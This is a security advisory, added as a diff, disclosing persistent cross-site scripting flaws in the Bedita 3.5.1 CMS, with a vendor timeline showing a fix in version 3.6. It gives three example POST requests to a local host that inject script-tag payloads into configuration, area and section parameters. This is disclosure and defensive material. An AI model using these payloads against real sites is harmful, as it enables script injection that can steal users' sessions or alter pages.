@@ -1,0 +1,98 @@
+########################################################################################
+
+# Title: Bedita 3.5.1 XSS vulnerabilites 
+# Application: Bedita
+# Version: 3.5.1
+# Software Link: http://www.bedita.com/
+# Date: 2015-03-09
+# Author: Sébastien Morin
+# Contact: https://twitter.com/SebMorin1
+# Category: Web Applications
+
+########################################################################################
+
+===================
+Introduction:
+===================
+
+BEdita is an open source web development framework that features a Content Management System (CMS) out-of-the-box.
+BEdita is built upon the PHP development framework CakePHP.
+
+(http://en.wikipedia.org/wiki/BEdita)
+
+########################################################################################
+
+===================
+Report Timeline:
+===================
+
+2015-03-09 Vulnerabilities reported to vendor
+2015-03-10 Vendor reponse
+2015-03-11 Vendor confirmed
+2015-08-31 Vendor releases version 3.6
+2015-08-31 Advisory Release
+
+
+########################################################################################
+
+===================
+Technical details:
+===================
+
+
+Persistent XSS:
+===============
+
+Bedita 3.5.1 contains multiples flaws that allows a persistent remote cross site scripting attack in the "cfg[projectName]", "data[stats_provider_url]" and "data[description]" parameters.
+This could allow malicious users to create a specially crafted POST request that would execute arbitrary
+code in a user's browser in order to gather data from them or to modify the content of the page presented to the user.
+
+
+Exploits Examples:
+
+
+1)cfg[projectName] parameter:
+
+ 	POST http://127.0.0.1/bedita/index.php/admin/saveConfig 
+	Host: 127.0.0.1
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://127.0.0.1/bedita/index.php/admin/viewConfig
+	Cookie: CAKEPHP=7jviahcvolu87hdp8dqbo25jl6
+	Connection: keep-alive
+
+	[...]cfg%5BprojectName%5D=<script>alert(12345)</script>[...]
+
+
+2) data[stats_provider_url] parameter:
+
+ 	POST http://127.0.0.1/bedita/index.php/areas/saveArea
+	Host: 127.0.0.1
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://127.0.0.1/bedita/index.php/areas/saveArea
+	Cookie: CAKEPHP=7jviahcvolu87hdp8dqbo25jl6
+	Connection: keep-alive
+
+	[...]data%5Bstats_provider_url%5D="><script>alert(12345)</script>[...]
+
+
+3) data[description] parameter:
+
+	POST http://127.0.0.1/bedita/index.php/areas/saveSection
+	Host: 127.0.0.1
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://127.0.0.1/bedita/index.php/areas/saveSection
+	Cookie: CAKEPHP=7jviahcvolu87hdp8dqbo25jl6
+	Connection: keep-alive
+
+	[...]data%5Bdescription%5D=&lt;/textarea&gt;<script>alert(123)</script>[...]
+
+########################################################################################
